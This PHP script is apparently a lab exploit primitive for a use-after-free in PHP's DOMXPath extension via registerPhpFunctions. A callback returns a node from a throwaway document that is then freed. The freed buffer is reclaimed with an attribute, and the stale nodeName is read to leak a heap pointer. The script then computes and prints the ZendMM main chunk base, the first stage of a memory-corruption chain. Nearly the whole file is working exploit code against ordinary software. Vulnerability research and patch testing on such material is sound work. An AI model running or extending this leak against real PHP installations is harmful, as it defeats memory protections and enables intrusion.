<?php
/**
 * LAB-ONLY GH-22554-style ZendMM seed using the OLD DOMXPath API
 * (`registerPhpFunctions` + `php:function`), for PHP 8.2/8.3 which do not
 * have `registerPHPFunctionNS`.
 *
 * A PHP callback returns a node from a throwaway document; after the xpath is
 * dropped the foreign document is freed but the result proxy still points at
 * its node. Reclaiming the freed tag-name buffer with an xmlAttr (whose
 * `_private` is an emalloc pointer) makes the stale `nodeName` read return raw
 * pointer bytes. `main = leak & ~0x1FFFFF`.
 *
 * See docs/VAR_DESTROY_UAF.md. Lab-only; fixed benign command elsewhere.
 */
$TAG = str_repeat('a', 95);
$doc = new DOMDocument;
$doc->loadXML('<root/>');
$xp = new DOMXPath($doc);
$xp->registerNamespace('php', 'http://php.net/xpath');

function cb_noref() {
    global $TAG;
    $d = new DOMDocument;
    $r = $d->appendChild($d->createElement('r'));
    $r->appendChild($d->createElement($TAG))
      ->appendChild($d->createTextNode('SECRETDATA'));
    return $d->documentElement;        /* throwaway: freed after the callback */
}

$xp->registerPhpFunctions(['cb_noref']);
$res = $xp->query('php:function("cb_noref")/' . $TAG);
$n = $res->item(0);
unset($xp, $res);

$keep = new DOMDocument;
$ke = $keep->appendChild($keep->createElement('k'));
$a = $keep->createAttributeNS('urn:x0', 'p0:a');
$ke->setAttributeNodeNS($a);

$nm = (string)@$n->nodeName;
$leak = unpack('P', substr($nm, 0, 6) . "\0\0")[1];
$main = $leak & ~0x1FFFFF;
printf("leak=%s main=%s\n", dechex($leak), dechex($main));
@flush();
